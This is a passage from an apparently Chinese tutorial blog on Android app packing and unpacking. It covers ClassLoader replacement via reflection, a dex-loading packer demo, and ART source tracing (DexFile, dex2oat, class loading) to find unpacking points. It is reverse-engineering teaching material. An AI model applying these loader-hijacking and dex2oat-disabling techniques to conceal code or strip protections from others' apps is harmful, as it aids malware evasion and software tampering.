mClassLoaderField.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">           <span class=\"type\">Object</span> <span class=\"variable\">mClassLoader</span> <span class=\"operator\">=</span>mClassLoaderField.get(LoadApkObj);</span><br><span class=\"line\">           Log.e(<span class=\"string\">&quot;mClassLoader&quot;</span>,mClassLoader.toString());</span><br><span class=\"line\">           <span class=\"comment\">//5.将系统组件ClassLoader给替换</span></span><br><span class=\"line\">           mClassLoaderField.set(LoadApkObj,dexClassLoader);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       <span class=\"keyword\">catch</span> (ClassNotFoundException e) &#123;</span><br><span class=\"line\">           e.printStackTrace();</span><br><span class=\"line\">       &#125; <span class=\"keyword\">catch</span> (NoSuchMethodException e) &#123;</span><br><span class=\"line\">           e.printStackTrace();</span><br><span class=\"line\">       &#125; <span class=\"keyword\">catch</span> (IllegalAccessException e) &#123;</span><br><span class=\"line\">           e.printStackTrace();</span><br><span class=\"line\">       &#125; <span class=\"keyword\">catch</span> (InvocationTargetException e) &#123;</span><br><span class=\"line\">           e.printStackTrace();</span><br><span class=\"line\">       &#125; <span class=\"keyword\">catch</span> (NoSuchFieldException e) &#123;</span><br><span class=\"line\">           e.printStackTrace();</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"lt-2-gt-类加载器插入\"><a href=\"#lt-2-gt-类加载器插入\" class=\"headerlink\" title=\"&lt;2&gt;类加载器插入\"></a>&lt;2&gt;类加载器插入</h5><p>还有一种方案，动态加载中我们讲述了类加载器的双亲委派机制，就是说我们的类加载器刚拿到类，并不会直接进行加载，而是先判断自己是否加载，如果没有加载则给自己的父类，父类再给父类，所以我们让DexClassLoader成为PathClassLoader的父类，这样就可以解决DexClassLoader生命周期的问题</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">总结：</span><br><span class=\"line\">\t（<span class=\"number\">1</span>）将DexClassloader父节点设置为BootClassLoader</span><br><span class=\"line\">\t（<span class=\"number\">2</span>）将PathClassLoader父节点设置为DexClassloader</span><br></pre></td></tr></table></figure>\n\n<p>代码实现：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">replaceClassLoader</span><span class=\"params\">(Context context, ClassLoader dexClassLoader)</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//将pathClassLoader父节点设置为DexClassLoader</span></span><br><span class=\"line\">        <span class=\"type\">ClassLoader</span> <span class=\"variable\">pathClassLoaderobj</span> <span class=\"operator\">=</span> context.getClassLoader();</span><br><span class=\"line\">        Class&lt;ClassLoader&gt; ClassLoaderClass = ClassLoader.class;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">Field</span> <span class=\"variable\">parent</span> <span class=\"operator\">=</span> ClassLoaderClass.getDeclaredField(<span class=\"string\">&quot;parent&quot;</span>);</span><br><span class=\"line\">            parent.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">            parent.set(pathClassLoaderobj,dexClassLoader);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (NoSuchFieldException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IllegalAccessException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>完成壳加载器的修正后，我们就可以正常的加载dex了</p>\n<h2 id=\"三、整体加壳案例实现\"><a href=\"#三、整体加壳案例实现\" class=\"headerlink\" title=\"三、整体加壳案例实现\"></a>三、整体加壳案例实现</h2><p>前面我们详细讲述了App运行机制和整体加壳的实现机制，下面我们就按照前面的讲述，来实现一个简单的整体加壳案例</p>\n<p>实验准备：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">源程序</span><br><span class=\"line\">加壳程序</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"1-编写源程序\"><a href=\"#1-编写源程序\" class=\"headerlink\" title=\"1.编写源程序\"></a>1.编写源程序</h3><p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/26.png\" alt=\"image-20220612193114397\"></p>\n<p>这就是我们的源程序，源程序运行，我们会在日志中看见我们打印的信息，然后我们生成dex文件</p>\n<h3 id=\"2-编写壳程序\"><a href=\"#2-编写壳程序\" class=\"headerlink\" title=\"2.编写壳程序\"></a>2.编写壳程序</h3><h4 id=\"（1）准备工作\"><a href=\"#（1）准备工作\" class=\"headerlink\" title=\"（1）准备工作\"></a>（1）准备工作</h4><p>将dex文件上传sdcard，并给应用设置存储权限</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/27.png\" alt=\"image-20220612195812601\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/30.png\" alt=\"image-20220612200126917\"></p>\n<h4 id=\"（2）编写代理类\"><a href=\"#（2）编写代理类\" class=\"headerlink\" title=\"（2）编写代理类\"></a>（2）编写代理类</h4><p>我们首先编写代理类，模仿上面的加壳应用</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/28.png\" alt=\"image-20220612193735398\"></p>\n<p>然后我们设置AndroidManifest.xml中的代理类别</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/29.png\" alt=\"image-20220612193921062\"></p>\n<p>然后我们选择在attachBaseContext或onCreate中对我们的dex进行动态加载和类加载器修正即可，因为这里我们源dex并未进行加密，所以也无需解密的过程</p>\n<p>然后加入导入类的Activity</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/34.png\" alt=\"image-20220612215843088\"></p>\n<h4 id=\"（3）动态加载\"><a href=\"#（3）动态加载\" class=\"headerlink\" title=\"（3）动态加载\"></a>（3）动态加载</h4><p>我们进行动态加载classes.dex</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/31.png\" alt=\"image-20220612200319851\"></p>\n<p>然后使用上面的一种方法进行类加载器修正</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/32.png\" alt=\"image-20220612215713138\"></p>\n<p>然后运行</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/33.png\" alt=\"image-20220612215745595\"></p>\n<p>运行成功，说明我们的整体加壳成功</p>\n<h2 id=\"四、脱壳点相关概念详解\"><a href=\"#四、脱壳点相关概念详解\" class=\"headerlink\" title=\"四、脱壳点相关概念详解\"></a>四、脱壳点相关概念详解</h2><p>上面我们已经理解了APP加壳的基本原理，下面我们进一步来学习如何进行脱壳，Android APP脱壳绕不开<code>DexFile</code>、<code>ArtMethod</code>两个概念，这两个在脱壳中扮演的至关重要的地位，无数的脱壳点都是从其演变而来。</p>\n<h3 id=\"1-Dex加载流程\"><a href=\"#1-Dex加载流程\" class=\"headerlink\" title=\"1.Dex加载流程\"></a>1.Dex加载流程</h3><p>我们在分析脱壳点过程中，首先就需要明白Dex加载的基本流程</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/40.png\" alt=\"image-20220612215745595\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">DexPathList:该类主要用来查找Dex、SO库的路径，并这些路径整体呈一个数组</span><br><span class=\"line\">Element:根据多路径的分隔符“;”将dexPath转换成File列表，记录所有的dexFile</span><br><span class=\"line\">DexFile:用来描述Dex文件，Dex的加载以及Class的查找都是由该类调用它的native方法完成的</span><br></pre></td></tr></table></figure>\n\n<p>我们依次来分析这个过程中的源码</p>\n<p><code>DexPathList</code></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">/libcore/dalvik/src/main/java/dalvik/system/DexPathList.java</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"title function_\">DexPathList</span><span class=\"params\">(ClassLoader definingContext, String dexPath,</span></span><br><span class=\"line\"><span class=\"params\">            String librarySearchPath, File optimizedDirectory)</span> &#123;</span><br><span class=\"line\">**********************      </span><br><span class=\"line\">   <span class=\"built_in\">this</span>.dexElements = makeDexElements(splitDexPath(dexPath), optimizedDirectory,</span><br><span class=\"line\">                                         suppressedExceptions, definingContext);    </span><br><span class=\"line\">**********************  </span><br><span class=\"line\">            &#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>makeDexElements</code></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Element[] makeDexElements(List&lt;File&gt; files, File optimizedDirectory,</span><br><span class=\"line\">          List&lt;IOException&gt; suppressedExceptions, ClassLoader loader) &#123;</span><br><span class=\"line\">**********************            </span><br><span class=\"line\">       <span class=\"type\">DexFile</span> <span class=\"variable\">dex</span> <span class=\"operator\">=</span> loadDexFile(file, optimizedDirectory, loader, elements);    </span><br><span class=\"line\">**********************         </span><br><span class=\"line\">          &#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>loadDexFile</code></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> DexFile <span class=\"title function_\">loadDexFile</span><span class=\"params\">(File file, File optimizedDirectory, ClassLoader loader,</span></span><br><span class=\"line\"><span class=\"params\">                                       Element[] elements)</span></span><br><span class=\"line\">            <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (optimizedDirectory == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">DexFile</span>(file, loader, elements);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">           <span class=\"type\">String</span> <span class=\"variable\">optimizedPath</span> <span class=\"operator\">=</span> optimizedPathFor(file, optimizedDirectory);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> DexFile.loadDex(file.getPath(), optimizedPath, <span class=\"number\">0</span>, loader, elements);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>loadDex</code></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">static</span> DexFile <span class=\"title function_\">loadDex</span><span class=\"params\">(String sourcePathName, String outputPathName,</span></span><br><span class=\"line\"><span class=\"params\">      <span class=\"type\">int</span> flags, ClassLoader loader, DexPathList.Element[] elements)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">DexFile</span>(sourcePathName, outputPathName, flags, loader, elements);</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>DexFile</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/libcore/dalvik/src/main/java/dalvik/system/DexFile.java</span><br><span class=\"line\">DexFile(String fileName, ClassLoader loader, DexPathList.Element[] elements) throws IOException &#123;</span><br><span class=\"line\">        mCookie = openDexFile(fileName, null, 0, loader, elements);</span><br><span class=\"line\">        mInternalCookie = mCookie;</span><br><span class=\"line\">        mFileName = fileName;</span><br><span class=\"line\">        //System.out.println(&quot;DEX FILE cookie is &quot; + mCookie + &quot; fileName=&quot; + fileName);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里出现的mCookie，mCookie在C&#x2F;C++层中是DexFile的指针，我们在下面详细讲解</p>\n<p><code>openDexFile</code></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Object <span class=\"title function_\">openDexFile</span><span class=\"params\">(String sourceName, String outputName, <span class=\"type\">int</span> flags,</span></span><br><span class=\"line\"><span class=\"params\">        ClassLoader loader, DexPathList.Element[] elements)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">       <span class=\"comment\">// Use absolute paths to enable the use of relative paths when testing on host.</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> openDexFileNative(<span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(sourceName).getAbsolutePath(),</span><br><span class=\"line\">                                 (outputName == <span class=\"literal\">null</span>)</span><br><span class=\"line\">                                    ? <span class=\"literal\">null</span></span><br><span class=\"line\">                                   : <span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(outputName).getAbsolutePath(),</span><br><span class=\"line\">                               \t   flags,</span><br><span class=\"line\">                                   loader,</span><br><span class=\"line\">                                   elements);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里就进入了C&#x2F;C++层</p>\n<p><code>openDexFileNative</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/41.png\" alt=\"image-20220613134340460\"></p>\n<p>为了节约篇幅，我们快速分析，中间再经过一些函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">OpenDexFilesFromOat()</span><br><span class=\"line\">MakeUpToDate()</span><br><span class=\"line\">GenerateOatFileNoChecks()</span><br><span class=\"line\">Dex2Oat()</span><br></pre></td></tr></table></figure>\n\n<p>最后进进入了Dex2Oat，这就进入了Dex2Oat的编译流程</p>\n<p>反之如果我们在下面Dex2Oat的流程中通过Hook相关方法或execv或execve导致dex2oat失败，我们就会返回到<code>OpenDexFilesFromOat</code></p>\n<p><code>OpenDexFilesFromOat</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/44.png\" alt=\"image-20220613145156590\"></p>\n<p>会先在<code>HasOriginalDexFiles</code>里尝试加载我们的Dex，也就是说，倘若我们的壳阻断了dex2oat的编译流程，然后又调用了DexFile的Open函数。</p>\n<p><code>DexFile::Open</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/45.png\" alt=\"image-20220613145606897\"></p>\n<p>校验dex的魔术字字段，然后调用<code>DexFile::OpenFile</code></p>\n<p><code>DexFile::OpenFile</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/art/runtime/dex_file.cc</span><br><span class=\"line\">std::unique_ptr&lt;const DexFile&gt; DexFile::OpenFile(int fd,</span><br><span class=\"line\">                                                const std::string&amp; location,</span><br><span class=\"line\">                                                bool verify,</span><br><span class=\"line\">                                                bool verify_checksum,</span><br><span class=\"line\">                                                std::string* error_msg) &#123;</span><br><span class=\"line\"> **************************************</span><br><span class=\"line\"> std::unique_ptr&lt;DexFile&gt; dex_file = OpenCommon(map-&gt;Begin(),</span><br><span class=\"line\">                                                map-&gt;Size(),</span><br><span class=\"line\">                                                location,</span><br><span class=\"line\">                                                dex_header-&gt;checksum_,</span><br><span class=\"line\">                                                kNoOatDexFile,</span><br><span class=\"line\">                                                verify,</span><br><span class=\"line\">                                                verify_checksum,</span><br><span class=\"line\">                                                error_msg);   </span><br><span class=\"line\">  **************************************</span><br><span class=\"line\">                                                </span><br><span class=\"line\">                                                &#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>OpenCommon</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/46.png\" alt=\"image-20220613145950224\"></p>\n<p>最后又再次回到<code>DexFile</code>类，这里我们的dex文件加载基本流程分析完毕</p>\n<h3 id=\"2-Dex2Oat编译流程\"><a href=\"#2-Dex2Oat编译流程\" class=\"headerlink\" title=\"2.Dex2Oat编译流程\"></a>2.Dex2Oat编译流程</h3><p>Dex2oat是google公司为了提高编译效率的一种机制，从Android8.0开始实施，一些加壳厂商实现抽取壳往往会禁用Dex2oat，而针对整体加壳没有禁用的Dex2Oat也成为了脱壳点</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/42.png\" alt=\"image-20220613134904994\"></p>\n<p><code>Exec</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">/art/runtime/exec_utils.<span class=\"function\">cc</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">bool</span> <span class=\"title\">Exec</span><span class=\"params\">(std::vector&lt;std::string&gt;&amp; arg_vector, std::string* error_msg)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> status = <span class=\"built_in\">ExecAndReturnCode</span>(arg_vector, error_msg);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (status != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"type\">const</span> std::string <span class=\"title\">command_line</span><span class=\"params\">(android::base::Join(arg_vector, <span class=\"string\">&#x27; &#x27;</span>))</span></span>;</span><br><span class=\"line\">    *error_msg = <span class=\"built_in\">StringPrintf</span>(<span class=\"string\">&quot;Failed execv(%s) because non-0 exit status&quot;</span>,</span><br><span class=\"line\">                              command_line.<span class=\"built_in\">c_str</span>());</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>ExecAndReturnCode</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/43.png\" alt=\"image-20220613143206138\"></p>\n<p>而我们就可以通过Hook execv或execve来禁用Dex2Oat，而如果我们不禁用dex2oat，<em>execve函数</em>是用来调用<code>dex2oat</code>的二进制程序实现对dex文件的加载，我们这时候找到<code>dex2oat.cc</code>这个文件，找到main函数</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">/art/dex2oat/dex2oat.cc</span><br><span class=\"line\"> <span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>** argv)</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> static_cast&lt;<span class=\"type\">int</span>&gt;(art::Dex2oat(argc, argv));</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!art::kIsDebugBuild &amp;&amp; (RUNNING_ON_MEMORY_TOOL == <span class=\"number\">0</span>)) &#123;</span><br><span class=\"line\">    _exit(result);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br></pre></td></tr></table></figure>\n\n<p>这里我们调用了Dex2oat</p>\n<p><code>Dex2Oat</code></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">/art/dex2oat/dex2oat.cc</span><br><span class=\"line\"><span class=\"keyword\">static</span> dex2oat::ReturnCode <span class=\"title function_\">Dex2oat</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>** argv)</span> &#123;</span><br><span class=\"line\">   **************************************</span><br><span class=\"line\">   dex2oat::<span class=\"type\">ReturnCode</span> <span class=\"variable\">setup_code</span> <span class=\"operator\">=</span> dex2oat-&gt;Setup();</span><br><span class=\"line\">    dex2oat::ReturnCode result;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (dex2oat-&gt;IsImage()) &#123;</span><br><span class=\"line\">    result = CompileImage(*dex2oat);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    result = CompileApp(*dex2oat);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">   **************************************</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Dex2oat中会对dex文件进行逐个类逐个函数的编译，setup()函数完成对dex的加载</p>\n<p>然后顺序执行，就会进入<code>CompileApp</code></p>\n<p>编译过程中会按照逐个函数进行编译，就会进入<code>CompileMethod</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/47.png\" alt=\"image-20220613151229524\"></p>\n<p>到这里Dex2oat的基本流程就分析完毕</p>\n<h3 id=\"3-类加载流程\"><a href=\"#3-类加载流程\" class=\"headerlink\" title=\"3.类加载流程\"></a>3.类加载流程</h3><p>要理解DexFile为什么如此重要，首先我们要清除Android APP的类加载流程。Android的类加载一般分为两类<code>隐式加载</code>和<code>显式加载</code></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>隐式加载:</span><br><span class=\"line\">    (<span class=\"number\">1</span>)创建类的实例,也就是<span class=\"keyword\">new</span>一个对象</span><br><span class=\"line\">    (<span class=\"number\">2</span>)访问某个类或接口的静态变量,或者对该静态变量赋值</span><br><span class=\"line\">    (<span class=\"number\">3</span>)调用类的静态方法</span><br><span class=\"line\">    (<span class=\"number\">4</span>)反射Class.forName(<span class=\"string\">&quot;android.app.ActivityThread&quot;</span>)</span><br><span class=\"line\">    (<span class=\"number\">5</span>)初始化一个类的子类(会首先初始化子类的父类)</span><br><span class=\"line\"><span class=\"number\">2.</span>显示加载：</span><br><span class=\"line\">    (<span class=\"number\">1</span>)使用LoadClass()加载</span><br><span class=\"line\">    (<span class=\"number\">2</span>)使用forName()加载</span><br></pre></td></tr></table></figure>\n\n<p>我们详细看一下显示加载：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Class.forName 和 ClassLoader.loadClass加载有何不同：</span><br><span class=\"line\">（<span class=\"number\">1</span>）ClassLoader.loadClass也能加载一个类,但是不会触发类的初始化(也就是说不会对类的静态变量,静态代码块进行初始化操作)</span><br><span class=\"line\">（<span class=\"number\">2</span>）Class.forName这种方式,不但会加载一个类,还会触发类的初始化阶段,也能够为这个类的静态变量,静态代码块进行初始化操作</span><br></pre></td></tr></table></figure>\n\n<p>我们在详细来看一下在类加载过程中的流程：</p>\n<p><code>java层</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/35.png\" alt=\"image-20220612215745595\"></p>\n<p>我们可以发现类加载中关键的DexFile，该类用来描述Dex文件，所以我们的脱壳对象就是<code>DexFile</code></p>\n<p>这里从DexFile进入Native层中，还有一个关键的字段就是<code>mCookie</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/36.png\" alt=\"image-20220613102141423\"></p>\n<p>后面我们详细的介绍<code>mCookie</code>的作用</p>\n<p>我们进一步分析，进入Native层</p>\n<p><code>Native层</code></p>\n<p>&#x2F;art&#x2F;runtime&#x2F;native&#x2F;[dalvik_system_DexFile.cc</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/37.png\" alt=\"image-20220613124716608\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ConvertJavaArrayToDexFiles对cookie进行了处理</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/38.png\" alt=\"image-20220613125016884\"></p>\n<p>通过这里的分析，我们可以知道mCooike转换为C&#x2F;C++层指针后，就是dexfile的索引</p>\n<p>我们继续分析<code>DefineClass</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">art/runtime/class_linker.<span class=\"function\">cc</span></span><br><span class=\"line\"><span class=\"function\">mirror::Class* <span class=\"title\">ClassLinker::DefineClass</span><span class=\"params\">(Thread* self,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                                      <span class=\"type\">const</span> <span class=\"type\">char</span>* descriptor,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                                        <span class=\"type\">size_t</span> hash,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                                       Handle&lt;mirror::ClassLoader&gt; class_loader,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                                        <span class=\"type\">const</span> DexFile&amp; dex_file,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                                        <span class=\"type\">const</span> DexFile::ClassDef&amp; dex_class_def)</span> </span>&#123;</span><br><span class=\"line\">***************</span><br><span class=\"line\"><span class=\"built_in\">LoadClass</span>(self, *new_dex_file, *new_class_def, klass);</span><br><span class=\"line\">***************</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>LoadClass</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">art/runtime/class_linker.<span class=\"function\">cc</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">ClassLinker::LoadClass</span><span class=\"params\">(Thread* self,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\"><span class=\"number\">3120</span>                            <span class=\"type\">const</span> DexFile&amp; dex_file,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\"><span class=\"number\">3121</span>                            <span class=\"type\">const</span> DexFile::ClassDef&amp; dex_class_def,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\"><span class=\"number\">3122</span>                            Handle&lt;mirror::Class&gt; klass)</span> </span>&#123;</span><br><span class=\"line\"><span class=\"number\">3123</span>  <span class=\"type\">const</span> <span class=\"type\">uint8_t</span>* class_data = dex_file.<span class=\"built_in\">GetClassData</span>(dex_class_def);</span><br><span class=\"line\"><span class=\"number\">3124</span>  <span class=\"keyword\">if</span> (class_data == <span class=\"literal\">nullptr</span>) &#123;</span><br><span class=\"line\"><span class=\"number\">3125</span>    <span class=\"keyword\">return</span>;  <span class=\"comment\">// no fields or methods - for example a marker interface</span></span><br><span class=\"line\"><span class=\"number\">3126</span>  &#125;</span><br><span class=\"line\"><span class=\"number\">3127</span>  <span class=\"built_in\">LoadClassMembers</span>(self, dex_file, class_data, klass);</span><br><span class=\"line\"><span class=\"number\">3128</span>&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>LoadClassMembers</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">art/runtime/class_linker.<span class=\"function\">cc</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">ClassLinker::LoadClassMembers</span><span class=\"params\">(Thread* self,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                                   <span class=\"type\">const</span> DexFile&amp; dex_file,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                                   <span class=\"type\">const</span> <span class=\"type\">uint8_t</span>* class_data,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                                   Handle&lt;mirror::Class&gt; klass)</span> </span>&#123;</span><br><span class=\"line\">***************</span><br><span class=\"line\">      <span class=\"built_in\">LoadMethod</span>(dex_file, it, klass, method);</span><br><span class=\"line\">      <span class=\"built_in\">LinkCode</span>(<span class=\"keyword\">this</span>, method, oat_class_ptr, class_def_method_index);</span><br><span class=\"line\">***************</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>LoadMethod</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">art/runtime/class_linker.<span class=\"function\">cc</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">ClassLinker::LoadMethod</span><span class=\"params\">(<span class=\"type\">const</span> DexFile&amp; dex_file,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                           <span class=\"type\">const</span> ClassDataItemIterator&amp; it,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                            Handle&lt;mirror::Class&gt; klass,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                             ArtMethod* dst)</span> </span>&#123;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>LinkCode</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/39.png\" alt=\"image-20220613130149629\"></p>\n<p>我们可以发现这里就进入了从linkcode后就进入了解释器中，并对是否进行dex2oat进行了判断，我们直接进入解释器中继续分析</p>\n<p>我们知道Art解释器分为两种：<code>解释模式下</code>和<code>quick模式下</code>，而我们又知道Android8.0开始进行dex2oat</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">如果壳没有禁用dex2oat，那类中的初始化函数运行在解释器模式下 </span><br><span class=\"line\">如果壳禁用dex2oat，dex文件中的所有函数都运行在解释器模式下</span><br><span class=\"line\">则类的初始化函数运行在解释器模式下</span><br></pre></td></tr></table></figure>\n\n<p>所以一般的加壳厂商会禁用掉dex2oat，这样可以是所有的函数都运行在解释模式下，所以一些脱壳点选在dex2oat流程中，可能针对禁用dex2oat的情况并不使用，我们这里主要针对整体加壳，就不展开讲述，最后我们得知解释器中会运行在<code>Execute</code>下</p>\n<p><code>Execute</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">art/runtime/interpreter/interpreter.<span class=\"function\">cc</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> JValue <span class=\"title\">Execute</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    Thread* self,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    <span class=\"type\">const</span> DexFile::CodeItem* 